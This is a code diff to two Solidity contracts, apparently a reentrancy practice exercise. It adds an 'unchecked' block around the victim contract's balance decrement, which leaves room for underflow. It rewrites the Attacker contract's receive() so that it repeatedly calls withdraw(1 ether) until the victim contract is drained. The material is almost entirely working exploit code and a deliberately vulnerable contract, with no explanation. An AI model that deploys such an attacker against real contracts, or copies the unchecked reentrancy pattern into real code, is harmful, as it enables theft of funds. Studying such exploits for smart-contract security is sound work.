@@ -19,7 +19,9 @@ contract Reentrance {
             if (result) {
                 _amount;
             }
-            balances[msg.sender] -= _amount;
+            unchecked {
+                balances[msg.sender] -= _amount;
+            }
         }
     }
 
@@ -45,19 +47,18 @@ contract Attacker {
     }
 
     // fallback() external payable {
-    //     // if (address(reentrance).balance >= 2 ether) {
-    //         reentrance.withdraw(0.5 ether);
-    //     // }
+    
+    //     if (address(reentrance).balance > 0 ether) {
+    //         reentrance.withdraw(1 ether);
+    //     }
     // }
 
-    function withdraw() public {
-        require(msg.sender == owner, "Only owner can withdraw");
-        owner.transfer(address(this).balance);
-    }
-
     receive() external payable {
-        if (address(reentrance).balance >= 1 ether) {
-            reentrance.withdraw(0.5 ether);
+        //  if (address(reentrance).balance > 0 ether) {
+        //     reentrance.withdraw(address(this).balance);
+        // }
+        if (address(reentrance).balance > 0 ether) {
+            reentrance.withdraw(1 ether);
         }
     }
 }
